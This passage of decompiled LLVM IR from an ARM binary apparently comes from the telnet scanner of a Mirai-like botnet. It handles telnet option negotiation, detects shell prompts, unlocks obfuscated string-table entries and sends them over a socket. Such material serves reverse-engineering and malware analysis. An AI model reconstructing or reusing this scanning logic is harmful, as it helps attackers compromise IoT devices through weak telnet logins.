  store i32 %v1_f980, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f984 = icmp eq i32 %v1_f980, 0
  store i1 %v2_f984, i1* %cpsr_z.global-to-local, align 1
  %tmp432 = icmp slt i32 %v1_f980, 1
  br i1 %tmp432, label %dec_label_pc_f704.backedge.thread, label %dec_label_pc_f98c

dec_label_pc_f98c:                                ; preds = %dec_label_pc_f97c
  %v2_f98c = add i32 %v1_f980, %v0_f784
  store i32 %v2_f98c, i32* %r3.global-to-local, align 4
  %v1_f990 = add i32 %v2_f98c, 28
  %v2_f990 = inttoptr i32 %v1_f990 to i8*
  %v3_f990 = load i8, i8* %v2_f990, align 1
  %v4_f990 = zext i8 %v3_f990 to i32
  store i32 %v4_f990, i32* %r3.global-to-local, align 4
  %v2_f994 = icmp ugt i8 %v3_f990, 61
  store i1 %v2_f994, i1* %cpsr_c.global-to-local, align 1
  %v7_f994 = icmp eq i8 %v3_f990, 62
  store i1 %v7_f994, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f994, label %dec_label_pc_f9f8, label %bb433

bb433:                                            ; preds = %dec_label_pc_f98c
  %v3_f998 = icmp ugt i8 %v3_f990, 57
  store i1 %v3_f998, i1* %cpsr_c.global-to-local, align 1
  %v8_f998 = icmp eq i8 %v3_f990, 58
  store i1 %v8_f998, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f998, label %dec_label_pc_f9f8, label %dec_label_pc_f9a0

dec_label_pc_f9a0:                                ; preds = %bb433
  %v2_f9a0 = icmp ugt i8 %v3_f990, 35
  store i1 %v2_f9a0, i1* %cpsr_c.global-to-local, align 1
  %v7_f9a0 = icmp eq i8 %v3_f990, 36
  store i1 %v7_f9a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f9a0, label %dec_label_pc_f9f8, label %dec_label_pc_f9a8

dec_label_pc_f9a8:                                ; preds = %dec_label_pc_f9a0
  %v2_f9a8 = icmp ugt i8 %v3_f990, 34
  store i1 %v2_f9a8, i1* %cpsr_c.global-to-local, align 1
  %v7_f9a8 = icmp eq i8 %v3_f990, 35
  store i1 %v7_f9a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f9a8, label %dec_label_pc_f9f8, label %dec_label_pc_f9b0

dec_label_pc_f9b0:                                ; preds = %dec_label_pc_f9a8
  %v2_f9b0 = icmp ugt i8 %v3_f990, 36
  store i1 %v2_f9b0, i1* %cpsr_c.global-to-local, align 1
  %v7_f9b0 = icmp eq i8 %v3_f990, 37
  store i1 %v7_f9b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f9b0, label %dec_label_pc_f9f8, label %dec_label_pc_f9e0.preheader

dec_label_pc_f9e0.preheader:                      ; preds = %dec_label_pc_f9b0
  %v3_f9b4 = add i32 %v0_f784, 28
  %v2_f9b8 = add i32 %v3_f9b4, %v3_f97c
  store i32 %v2_f9b8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f9e0

dec_label_pc_f9c4:                                ; preds = %bb434
  %v2_f9c4 = icmp ugt i8 %v3_f9e8, 35
  store i1 %v2_f9c4, i1* %cpsr_c.global-to-local, align 1
  %v7_f9c4 = icmp eq i8 %v3_f9e8, 36
  store i1 %v7_f9c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f9c4, label %dec_label_pc_f9f8, label %dec_label_pc_f9cc

dec_label_pc_f9cc:                                ; preds = %dec_label_pc_f9c4
  %v2_f9cc = icmp ugt i8 %v3_f9e8, 34
  store i1 %v2_f9cc, i1* %cpsr_c.global-to-local, align 1
  %v7_f9cc = icmp eq i8 %v3_f9e8, 35
  store i1 %v7_f9cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f9cc, label %dec_label_pc_f9f8, label %dec_label_pc_f9d4

dec_label_pc_f9d4:                                ; preds = %dec_label_pc_f9cc
  %v2_f9d4 = icmp ugt i8 %v3_f9e8, 36
  store i1 %v2_f9d4, i1* %cpsr_c.global-to-local, align 1
  %v7_f9d4 = icmp eq i8 %v3_f9e8, 37
  store i1 %v7_f9d4, i1* %cpsr_z.global-to-local, align 1
  %v1_f9d8 = add i32 %v0_f9d8, -1
  store i32 %v1_f9d8, i32* %r3.global-to-local, align 4
  br i1 %v7_f9d4, label %dec_label_pc_f9f8, label %dec_label_pc_f9e0

dec_label_pc_f9e0:                                ; preds = %dec_label_pc_f9e0.preheader, %dec_label_pc_f9d4
  %v0_f9d8 = phi i32 [ %v2_f9b8, %dec_label_pc_f9e0.preheader ], [ %v1_f9d8, %dec_label_pc_f9d4 ]
  %v0_f9e0 = phi i32 [ %v1_f980, %dec_label_pc_f9e0.preheader ], [ %v1_f9e0, %dec_label_pc_f9d4 ]
  %v1_f9e0 = add i32 %v0_f9e0, -1
  store i32 %v1_f9e0, i32* %r1.global-to-local, align 4
  %v2_f9e0 = icmp ne i32 %v0_f9e0, 0
  store i1 %v2_f9e0, i1* %cpsr_c.global-to-local, align 1
  %v7_f9e0 = icmp eq i32 %v0_f9e0, 1
  store i1 %v7_f9e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f9e0, label %dec_label_pc_f704.backedge.thread564, label %dec_label_pc_f9e8

dec_label_pc_f9e8:                                ; preds = %dec_label_pc_f9e0
  %v1_f9e8 = add i32 %v0_f9d8, -2
  %v2_f9e8 = inttoptr i32 %v1_f9e8 to i8*
  %v3_f9e8 = load i8, i8* %v2_f9e8, align 1
  %v4_f9e8 = zext i8 %v3_f9e8 to i32
  store i32 %v4_f9e8, i32* %r2.global-to-local, align 4
  %v2_f9ec = icmp ugt i8 %v3_f9e8, 61
  store i1 %v2_f9ec, i1* %cpsr_c.global-to-local, align 1
  %v7_f9ec = icmp eq i8 %v3_f9e8, 62
  store i1 %v7_f9ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f9ec, label %dec_label_pc_f9f8, label %bb434

bb434:                                            ; preds = %dec_label_pc_f9e8
  %v3_f9f0 = icmp ugt i8 %v3_f9e8, 57
  store i1 %v3_f9f0, i1* %cpsr_c.global-to-local, align 1
  %v8_f9f0 = icmp eq i8 %v3_f9e8, 58
  store i1 %v8_f9f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f9f0, label %dec_label_pc_f9f8, label %dec_label_pc_f9c4

dec_label_pc_f9f8:                                ; preds = %dec_label_pc_f9e8, %bb434, %dec_label_pc_f9d4, %dec_label_pc_f9cc, %dec_label_pc_f9c4, %dec_label_pc_f9b0, %dec_label_pc_f98c, %dec_label_pc_f9a8, %dec_label_pc_f9a0, %bb433
  %v0_f9fc = phi i32 [ %v1_f980, %dec_label_pc_f9b0 ], [ %v1_f980, %dec_label_pc_f98c ], [ %v1_f980, %dec_label_pc_f9a8 ], [ %v1_f980, %dec_label_pc_f9a0 ], [ %v1_f980, %bb433 ], [ %v1_f9e0, %dec_label_pc_f9c4 ], [ %v1_f9e0, %dec_label_pc_f9cc ], [ %v1_f9e0, %dec_label_pc_f9d4 ], [ %v1_f9e0, %bb434 ], [ %v1_f9e0, %dec_label_pc_f9e8 ]
  %v1_f9fc = add i32 %v0_f9fc, 1
  store i32 %v1_f9fc, i32* @r7, align 4
  %v1_fa00 = call i32 @table_unlock_val(i32 10)
  store i32 %v2_10060, i32* %r1.global-to-local, align 4
  %v3_fa10 = call i32 @table_retrieve_val(i32 10, i32* nonnull %stack_var_-60)
  %v3_fa14 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_fa14, i32* %r2.global-to-local, align 4
  store i32 %v3_fa10, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_fa20 = load i32, i32* @r6, align 4
  %v1_fa20 = add i32 %v0_fa20, 4
  %v2_fa20 = inttoptr i32 %v1_fa20 to i32*
  %v3_fa20 = load i32, i32* %v2_fa20, align 4
  %v4_fa24 = call i32 @__libc_send(i32 %v3_fa20, i32 %v3_fa10, i32 %v3_fa14, i32 16384)
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19b50.207 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_fa34 = load i32, i32* @r6, align 4
  %v1_fa34 = add i32 %v0_fa34, 4
  %v2_fa34 = inttoptr i32 %v1_fa34 to i32*
  %v3_fa34 = load i32, i32* %v2_fa34, align 4
  %v4_fa38 = call i32 @__libc_send(i32 %v3_fa34, i32 ptrtoint ([3 x i8]* @global_var_19b50.207 to i32), i32 2, i32 16384)
  %v1_fa40 = call i32 @table_lock_val(i32 10)
  store i32 10, i32* @r3, align 4
  %v1_fa48 = load i32, i32* @r6, align 4
  %v2_fa48 = add i32 %v1_fa48, 12
  %v3_fa48 = inttoptr i32 %v2_fa48 to i32*
  store i32 10, i32* %v3_fa48, align 4
  br label %dec_label_pc_f954

dec_label_pc_fa50:                                ; preds = %dec_label_pc_f784
  %v1_fa50 = add i32 %v0_f784, 24
  %v2_fa50 = inttoptr i32 %v1_fa50 to i32*
  %v3_fa50 = load i32, i32* %v2_fa50, align 4
  store i32 %v3_fa50, i32* %r1.global-to-local, align 4
  %v0_fa54 = load i32, i32* @fp, align 4
  store i32 %v0_fa54, i32* @r4, align 4
  store i32 0, i32* @r7, align 4
  %v3_fa5c172 = icmp eq i32 %v3_fa50, 0
  store i1 %v3_fa5c172, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_fa5c172, i1* %cpsr_z.global-to-local, align 1
  %v6_fa60179 = icmp sgt i32 %v3_fa50, 0
  br i1 %v6_fa60179, label %dec_label_pc_fa64.preheader, label %dec_label_pc_fb10

dec_label_pc_fa5c.loopexit:                       ; preds = %dec_label_pc_fa80
  %v2_fa88 = add i32 %v1_fa88, 2
  store i32 %v2_fa88, i32* @r4, align 4
  %v2_fa8c = add i32 %v1_fa8c, 2
  store i32 %v2_fa8c, i32* @r7, align 4
  %v3_fa5c = icmp uge i32 %v2_fa8c, %v1_fa5c
  store i1 %v3_fa5c, i1* %cpsr_c.global-to-local, align 1
  %v9_fa5c = icmp eq i32 %v2_fa8c, %v1_fa5c
  store i1 %v9_fa5c, i1* %cpsr_z.global-to-local, align 1
  %v6_fa60 = icmp slt i32 %v2_fa8c, %v1_fa5c
  br i1 %v6_fa60, label %dec_label_pc_fa64.preheader, label %dec_label_pc_fb10

dec_label_pc_fa64.preheader:                      ; preds = %dec_label_pc_fa50, %dec_label_pc_fa5c.loopexit
  %v6_fb18273 = phi i32 [ %v6_fb18274, %dec_label_pc_fa5c.loopexit ], [ %v0_f784, %dec_label_pc_fa50 ]
  %v1_fa8c262 = phi i32 [ %v2_fa8c, %dec_label_pc_fa5c.loopexit ], [ 0, %dec_label_pc_fa50 ]
  %v1_fa70260 = phi i32 [ %v1_fa5c, %dec_label_pc_fa5c.loopexit ], [ %v3_fa50, %dec_label_pc_fa50 ]
  %v0_fa64258 = phi i32 [ %v2_fa88, %dec_label_pc_fa5c.loopexit ], [ %v0_fa54, %dec_label_pc_fa50 ]
  br label %dec_label_pc_fa64

dec_label_pc_fa64:                                ; preds = %dec_label_pc_fa64.preheader, %dec_label_pc_faf4
  %v6_fb18274 = phi i32 [ %v6_fb18273, %dec_label_pc_fa64.preheader ], [ %v0_fafc, %dec_label_pc_faf4 ]
  %v1_fa8c = phi i32 [ %v1_fa8c262, %dec_label_pc_fa64.preheader ], [ %v1_fb00, %dec_label_pc_faf4 ]
  %v1_fa5c = phi i32 [ %v1_fa70260, %dec_label_pc_fa64.preheader ], [ %v3_fafc, %dec_label_pc_faf4 ]
  %v1_fa88 = phi i32 [ %v0_fa64258, %dec_label_pc_fa64.preheader ], [ %v1_fb08, %dec_label_pc_faf4 ]
  %v1_fa64 = inttoptr i32 %v1_fa88 to i8*
  %v2_fa64 = load i8, i8* %v1_fa64, align 1
  %v3_fa64 = zext i8 %v2_fa64 to i32
  store i32 %v3_fa64, i32* @r3, align 4
  %v2_fa68 = icmp eq i8 %v2_fa64, -1
  store i1 %v2_fa68, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_fa68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fa68, label %dec_label_pc_fa70, label %dec_label_pc_fb10

dec_label_pc_fa70:                                ; preds = %dec_label_pc_fa64
  %v0_fa70 = load i32, i32* @fp, align 4
  %v2_fa70 = add i32 %v0_fa70, %v1_fa5c
  store i32 %v2_fa70, i32* %r2.global-to-local, align 4
  %v1_fa74 = add i32 %v1_fa88, 1
  store i32 %v1_fa74, i32* @r5, align 4
  %v3_fa78 = icmp uge i32 %v2_fa70, %v1_fa74
  store i1 %v3_fa78, i1* %cpsr_c.global-to-local, align 1
  %v9_fa78 = icmp eq i32 %v2_fa70, %v1_fa74
  store i1 %v9_fa78, i1* %cpsr_z.global-to-local, align 1
  %v2_fa7c = xor i1 %v3_fa78, true
  %v3_fa7c = or i1 %v9_fa78, %v2_fa7c
  br i1 %v3_fa7c, label %dec_label_pc_fb10, label %dec_label_pc_fa80

dec_label_pc_fa80:                                ; preds = %dec_label_pc_fa70
  %v2_fa80 = inttoptr i32 %v1_fa74 to i8*
  %v3_fa80 = load i8, i8* %v2_fa80, align 1
  %v4_fa80 = zext i8 %v3_fa80 to i32
  store i32 %v4_fa80, i32* @r3, align 4
  %v2_fa84 = icmp eq i8 %v3_fa80, -1
  store i1 %v2_fa84, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_fa84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fa84, label %dec_label_pc_fa5c.loopexit, label %dec_label_pc_fa94

dec_label_pc_fa94:                                ; preds = %dec_label_pc_fa80
  %v2_fa94 = icmp ugt i8 %v3_fa80, -4
  store i1 %v2_fa94, i1* %cpsr_c.global-to-local, align 1
  %v7_fa94 = icmp eq i8 %v3_fa80, -3
  store i1 %v7_fa94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fa94, label %dec_label_pc_100f0, label %dec_label_pc_fa9c

dec_label_pc_fa9c:                                ; preds = %dec_label_pc_fa94
  %v1_fa9c = add i32 %v1_fa88, 2
  store i32 %v1_fa9c, i32* @r3, align 4
  %v3_faa0 = icmp uge i32 %v2_fa70, %v1_fa9c
  store i1 %v3_faa0, i1* %cpsr_c.global-to-local, align 1
  %v9_faa0 = icmp eq i32 %v2_fa70, %v1_fa9c
  store i1 %v9_faa0, i1* %cpsr_z.global-to-local, align 1
  %v2_faa4 = xor i1 %v3_faa0, true
  %v3_faa4 = or i1 %v9_faa0, %v2_faa4
  br i1 %v3_faa4, label %dec_label_pc_fb10, label %dec_label_pc_faa8

dec_label_pc_faa8:                                ; preds = %dec_label_pc_10154, %bb458, %.thread147, %dec_label_pc_fa9c
  %v0_faa8 = load i32, i32* @r5, align 4
  %v1_faa8 = inttoptr i32 %v0_faa8 to i8*
  %v2_faa8 = load i8, i8* %v1_faa8, align 1
  %v3_faa8 = zext i8 %v2_faa8 to i32
  store i32 %v3_faa8, i32* %r3.global-to-local, align 4
  %v2_faac = icmp ugt i8 %v2_faa8, -4
  store i1 %v2_faac, i1* %cpsr_c.global-to-local, align 1
  %v7_faac = icmp eq i8 %v2_faa8, -3
  store i1 %v7_faac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_faac, label %.thread97, label %dec_label_pc_fabc

.thread97:                                        ; preds = %dec_label_pc_faa8
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v1_faa8, align 1
  %v0_fab8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_fab8.pr.pr, label %.thread100, label %.thread97.dec_label_pc_fabcthread-pre-split_crit_edge

.thread97.dec_label_pc_fabcthread-pre-split_crit_edge: ; preds = %.thread97
  %v0_fabc.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fabc

dec_label_pc_fabc:                                ; preds = %dec_label_pc_faa8, %.thread97.dec_label_pc_fabcthread-pre-split_crit_edge
  %v0_fabc.pr = phi i32 [ %v0_fabc.pr.pre, %.thread97.dec_label_pc_fabcthread-pre-split_crit_edge ], [ %v3_faa8, %dec_label_pc_faa8 ]
  %v2_fabc = icmp ugt i32 %v0_fabc.pr, 250
  store i1 %v2_fabc, i1* %cpsr_c.global-to-local, align 1
  %v7_fabc = icmp eq i32 %v0_fabc.pr, 251
  store i1 %v7_fabc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fabc, label %bb435, label %.thread100

bb435:                                            ; preds = %dec_label_pc_fabc
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_fac4 = load i32, i32* @r5, align 4
  %v4_fac4 = inttoptr i32 %v3_fac4 to i8*
  store i8 -3, i8* %v4_fac4, align 1
  br label %.thread100

.thread100:                                       ; preds = %dec_label_pc_fabc, %.thread97, %bb435
  %v0_fac8 = load i32, i32* @r4, align 4
  %v1_fac8 = add i32 %v0_fac8, 2
  %v2_fac8 = inttoptr i32 %v1_fac8 to i8*
  %v3_fac8 = load i8, i8* %v2_fac8, align 1
  %v4_fac8 = zext i8 %v3_fac8 to i32
  store i32 %v4_fac8, i32* %r3.global-to-local, align 4
  %v2_facc = icmp ugt i8 %v3_fac8, -4
  store i1 %v2_facc, i1* %cpsr_c.global-to-local, align 1
  %v7_facc = icmp eq i8 %v3_fac8, -3
  store i1 %v7_facc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_facc, label %.thread101, label %dec_label_pc_fadc

.thread101:                                       ; preds = %.thread100
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v2_fac8, align 1
  %v0_fad8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_fad8.pr.pr, label %.thread104, label %.thread101.dec_label_pc_fadcthread-pre-split_crit_edge

.thread101.dec_label_pc_fadcthread-pre-split_crit_edge: ; preds = %.thread101
  %v0_fadc.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fadc

dec_label_pc_fadc:                                ; preds = %.thread100, %.thread101.dec_label_pc_fadcthread-pre-split_crit_edge
  %v0_fadc.pr = phi i32 [ %v0_fadc.pr.pre, %.thread101.dec_label_pc_fadcthread-pre-split_crit_edge ], [ %v4_fac8, %.thread100 ]
  %v2_fadc = icmp ugt i32 %v0_fadc.pr, 250
  store i1 %v2_fadc, i1* %cpsr_c.global-to-local, align 1
  %v7_fadc = icmp eq i32 %v0_fadc.pr, 251
  store i1 %v7_fadc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fadc, label %bb436, label %.thread104

bb436:                                            ; preds = %dec_label_pc_fadc
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_fae4 = load i32, i32* @r4, align 4
  %v4_fae4 = add i32 %v3_fae4, 2
  %v5_fae4 = inttoptr i32 %v4_fae4 to i8*
  store i8 -3, i8* %v5_fae4, align 1
  br label %.thread104

.thread104:                                       ; preds = %dec_label_pc_fadc, %.thread101, %bb436
  %v0_faec = load i32, i32* @r4, align 4
  br label %dec_label_pc_faf4

dec_label_pc_faf4:                                ; preds = %dec_label_pc_10204, %.thread104
  %storemerge3 = phi i32 [ %v2_10108, %dec_label_pc_10204 ], [ %v0_faec, %.thread104 ]
  %storemerge2 = phi i32 [ 9, %dec_label_pc_10204 ], [ 3, %.thread104 ]
  %v0_faf8.in.in.in = load i32, i32* @r6, align 4
  %v0_faf8.in.in = add i32 %v0_faf8.in.in.in, 4
  %v0_faf8.in = inttoptr i32 %v0_faf8.in.in to i32*
  %v0_faf8 = load i32, i32* %v0_faf8.in, align 4
  store i32 %storemerge3, i32* %r1.global-to-local, align 4
  store i32 %storemerge2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_faf8 = call i32 @__libc_send(i32 %v0_faf8, i32 %storemerge3, i32 %storemerge2, i32 16384)
  %v0_fafc = load i32, i32* @r6, align 4
  %v1_fafc = add i32 %v0_fafc, 24
  %v2_fafc = inttoptr i32 %v1_fafc to i32*
  %v3_fafc = load i32, i32* %v2_fafc, align 4
  store i32 %v3_fafc, i32* %r1.global-to-local, align 4
  %v0_fb00 = load i32, i32* @r7, align 4
  %v1_fb00 = add i32 %v0_fb00, 3
  store i32 %v1_fb00, i32* @r7, align 4
  %v3_fb04 = icmp uge i32 %v1_fb00, %v3_fafc
  store i1 %v3_fb04, i1* %cpsr_c.global-to-local, align 1
  %v9_fb04 = icmp eq i32 %v1_fb00, %v3_fafc
  store i1 %v9_fb04, i1* %cpsr_z.global-to-local, align 1
  %v0_fb08 = load i32, i32* @r4, align 4
  %v1_fb08 = add i32 %v0_fb08, 3
  store i32 %v1_fb08, i32* @r4, align 4
  %v5_fb0c = icmp slt i32 %v1_fb00, %v3_fafc
  br i1 %v5_fb0c, label %dec_label_pc_fa64, label %dec_label_pc_fb10

dec_label_pc_fb10:                                ; preds = %dec_label_pc_fa5c.loopexit, %dec_label_pc_fa64, %dec_label_pc_faf4, %dec_label_pc_fa9c, %dec_label_pc_fa70, %dec_label_pc_fa50, %dec_label_pc_100f0.dec_label_pc_fb10.loopexit_crit_edge
  %v6_fb18 = phi i32 [ %v0_10120, %dec_label_pc_100f0.dec_label_pc_fb10.loopexit_crit_edge ], [ %v0_f784, %dec_label_pc_fa50 ], [ %v6_fb18274, %dec_label_pc_fa64 ], [ %v0_fafc, %dec_label_pc_faf4 ], [ %v6_fb18274, %dec_label_pc_fa9c ], [ %v6_fb18274, %dec_label_pc_fa70 ], [ %v6_fb18274, %dec_label_pc_fa5c.loopexit ]
  %v0_fb10 = phi i32 [ %v0_fb10.pre.pre, %dec_label_pc_100f0.dec_label_pc_fb10.loopexit_crit_edge ], [ 0, %dec_label_pc_fa50 ], [ %v1_fa8c, %dec_label_pc_fa64 ], [ %v1_fb00, %dec_label_pc_faf4 ], [ %v1_fa8c, %dec_label_pc_fa9c ], [ %v1_fa8c, %dec_label_pc_fa70 ], [ %v2_fa8c, %dec_label_pc_fa5c.loopexit ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fb10 = icmp eq i32 %v0_fb10, 0
  store i1 %v2_fb10, i1* %cpsr_z.global-to-local, align 1
  %tmp437 = icmp slt i32 %v0_fb10, 1
  br i1 %tmp437, label %dec_label_pc_f94c, label %bb438

bb438:                                            ; preds = %dec_label_pc_fb10
  store i32 3, i32* @r3, align 4
  %v7_fb18 = add i32 %v6_fb18, 12
  %v8_fb18 = inttoptr i32 %v7_fb18 to i32*
  store i32 3, i32* %v8_fb18, align 4
  br label %dec_label_pc_f94c

dec_label_pc_fb20:                                ; preds = %dec_label_pc_f784
  %v1_fb20 = add i32 %v0_f784, 24
  %v2_fb20 = inttoptr i32 %v1_fb20 to i32*
  %v3_fb20 = load i32, i32* %v2_fb20, align 4
  store i32 %v3_fb20, i32* %r2.global-to-local, align 4
  %v1_fb24 = add i32 %v3_fb20, -1
  store i32 %v1_fb24, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fb28 = icmp eq i32 %v1_fb24, 0
  store i1 %v2_fb28, i1* %cpsr_z.global-to-local, align 1
  %tmp439 = icmp slt i32 %v1_fb24, 1
  br i1 %tmp439, label %dec_label_pc_f704.backedge.thread, label %dec_label_pc_fb30

dec_label_pc_fb30:                                ; preds = %dec_label_pc_fb20
  %v2_fb30 = add i32 %v1_fb24, %v0_f784
  store i32 %v2_fb30, i32* %r3.global-to-local, align 4
  %v1_fb34 = add i32 %v2_fb30, 28
  %v2_fb34 = inttoptr i32 %v1_fb34 to i8*
  %v3_fb34 = load i8, i8* %v2_fb34, align 1
  %v4_fb34 = zext i8 %v3_fb34 to i32
  store i32 %v4_fb34, i32* %r3.global-to-local, align 4
  %v2_fb38 = icmp ugt i8 %v3_fb34, 61
  store i1 %v2_fb38, i1* %cpsr_c.global-to-local, align 1
  %v7_fb38 = icmp eq i8 %v3_fb34, 62
  store i1 %v7_fb38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb38, label %dec_label_pc_fb9c, label %bb440

bb440:                                            ; preds = %dec_label_pc_fb30
  %v3_fb3c = icmp ugt i8 %v3_fb34, 57
  store i1 %v3_fb3c, i1* %cpsr_c.global-to-local, align 1
  %v8_fb3c = icmp eq i8 %v3_fb34, 58
  store i1 %v8_fb3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fb3c, label %dec_label_pc_fb9c, label %dec_label_pc_fb44

dec_label_pc_fb44:                                ; preds = %bb440
  %v2_fb44 = icmp ugt i8 %v3_fb34, 35
  store i1 %v2_fb44, i1* %cpsr_c.global-to-local, align 1
  %v7_fb44 = icmp eq i8 %v3_fb34, 36
  store i1 %v7_fb44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb44, label %dec_label_pc_fb9c, label %dec_label_pc_fb4c

dec_label_pc_fb4c:                                ; preds = %dec_label_pc_fb44
  %v2_fb4c = icmp ugt i8 %v3_fb34, 34
  store i1 %v2_fb4c, i1* %cpsr_c.global-to-local, align 1
  %v7_fb4c = icmp eq i8 %v3_fb34, 35
  store i1 %v7_fb4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb4c, label %dec_label_pc_fb9c, label %dec_label_pc_fb54

dec_label_pc_fb54:                                ; preds = %dec_label_pc_fb4c
  %v2_fb54 = icmp ugt i8 %v3_fb34, 36
  store i1 %v2_fb54, i1* %cpsr_c.global-to-local, align 1
  %v7_fb54 = icmp eq i8 %v3_fb34, 37
  store i1 %v7_fb54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb54, label %dec_label_pc_fb9c, label %dec_label_pc_fb84.preheader

dec_label_pc_fb84.preheader:                      ; preds = %dec_label_pc_fb54
  %v3_fb58 = add i32 %v0_f784, 28
  %v2_fb5c = add i32 %v3_fb58, %v3_fb20
  store i32 %v2_fb5c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fb84

dec_label_pc_fb68:                                ; preds = %bb441
  %v2_fb68 = icmp ugt i8 %v3_fb8c, 35
  store i1 %v2_fb68, i1* %cpsr_c.global-to-local, align 1
  %v7_fb68 = icmp eq i8 %v3_fb8c, 36
  store i1 %v7_fb68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb68, label %dec_label_pc_fb9c, label %dec_label_pc_fb70

dec_label_pc_fb70:                                ; preds = %dec_label_pc_fb68
  %v2_fb70 = icmp ugt i8 %v3_fb8c, 34
  store i1 %v2_fb70, i1* %cpsr_c.global-to-local, align 1
  %v7_fb70 = icmp eq i8 %v3_fb8c, 35
  store i1 %v7_fb70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb70, label %dec_label_pc_fb9c, label %dec_label_pc_fb78

dec_label_pc_fb78:                                ; preds = %dec_label_pc_fb70
  %v2_fb78 = icmp ugt i8 %v3_fb8c, 36
  store i1 %v2_fb78, i1* %cpsr_c.global-to-local, align 1
  %v7_fb78 = icmp eq i8 %v3_fb8c, 37
  store i1 %v7_fb78, i1* %cpsr_z.global-to-local, align 1
  %v1_fb7c = add i32 %v0_fb7c, -1
  store i32 %v1_fb7c, i32* %r3.global-to-local, align 4
  br i1 %v7_fb78, label %dec_label_pc_fb9c, label %dec_label_pc_fb84

dec_label_pc_fb84:                                ; preds = %dec_label_pc_fb84.preheader, %dec_label_pc_fb78
  %v0_fb7c = phi i32 [ %v2_fb5c, %dec_label_pc_fb84.preheader ], [ %v1_fb7c, %dec_label_pc_fb78 ]
  %v0_fb84 = phi i32 [ %v1_fb24, %dec_label_pc_fb84.preheader ], [ %v1_fb84, %dec_label_pc_fb78 ]
  %v1_fb84 = add i32 %v0_fb84, -1
  store i32 %v1_fb84, i32* %r1.global-to-local, align 4
  %v2_fb84 = icmp ne i32 %v0_fb84, 0
  store i1 %v2_fb84, i1* %cpsr_c.global-to-local, align 1
  %v7_fb84 = icmp eq i32 %v0_fb84, 1
  store i1 %v7_fb84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb84, label %dec_label_pc_f704.backedge.thread564, label %dec_label_pc_fb8c

dec_label_pc_fb8c:                                ; preds = %dec_label_pc_fb84
  %v1_fb8c = add i32 %v0_fb7c, -2
  %v2_fb8c = inttoptr i32 %v1_fb8c to i8*
  %v3_fb8c = load i8, i8* %v2_fb8c, align 1
  %v4_fb8c = zext i8 %v3_fb8c to i32
  store i32 %v4_fb8c, i32* %r2.global-to-local, align 4
  %v2_fb90 = icmp ugt i8 %v3_fb8c, 61
  store i1 %v2_fb90, i1* %cpsr_c.global-to-local, align 1
  %v7_fb90 = icmp eq i8 %v3_fb8c, 62
  store i1 %v7_fb90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb90, label %dec_label_pc_fb9c, label %bb441

bb441:                                            ; preds = %dec_label_pc_fb8c
  %v3_fb94 = icmp ugt i8 %v3_fb8c, 57
  store i1 %v3_fb94, i1* %cpsr_c.global-to-local, align 1
  %v8_fb94 = icmp eq i8 %v3_fb8c, 58
  store i1 %v8_fb94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fb94, label %dec_label_pc_fb9c, label %dec_label_pc_fb68

dec_label_pc_fb9c:                                ; preds = %dec_label_pc_fb8c, %bb441, %dec_label_pc_fb78, %dec_label_pc_fb70, %dec_label_pc_fb68, %dec_label_pc_fb54, %dec_label_pc_fb30, %dec_label_pc_fb4c, %dec_label_pc_fb44, %bb440
